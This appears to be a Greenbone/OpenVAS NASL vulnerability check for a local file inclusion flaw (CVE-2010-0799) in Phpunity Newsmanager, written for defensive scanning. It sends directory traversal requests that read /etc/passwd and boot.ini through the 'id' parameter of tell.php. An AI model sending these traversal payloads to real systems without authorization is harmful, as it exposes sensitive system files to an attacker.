if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800484" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2010-03-10 15:48:25 +0100 (Wed, 10 Mar 2010)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2010-0799" );
	script_name( "Phpunity Newsmanager Local File Inclusion Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/38409" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/11290" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/1001-exploits/phpunity-lfi.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "affected", value: "Phpunity.Newsmanager" );
	script_tag( name: "insight", value: "Input passed to the 'id' parameter in 'misc/tell_a_friend/tell.php' is not
  properly verified before being used to read files. This can be exploited to
  partially disclose content of arbitrary files via directory traversal attacks
  and URL-encoded NULL bytes." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running Phpunity Newsmanager and is prone to local
  file inclusion vulnerability." );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to disclose potentially sensitive
  information." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/phpunity.newsmanager", "/Phpunity_Newsmanager", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	req = http_get( item: dir + "/tmpl/news_main.htm", port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(( ContainsString( res, ":: phpunity.newsmanager ::" ) )){
		req = http_get( item: NASLString( dir, "/misc/tell_a_friend/tell.php?id=" + "../../../../../../../etc/passwd" ), port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, ":daemon:/sbin:/sbin/" )){
			security_message( port: port );
			exit( 0 );
		}
		req = http_get( item: NASLString( dir, "/misc/tell_a_friend/tell.php?id=" + "../../../../../../../boot.ini" ), port: port );
		res = http_keepalive_send_recv( port: port, data: req );
		if(ContainsString( res, "\\WINDOWS" ) || ContainsString( res, "operating systems" ) || ContainsString( res, "partition" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

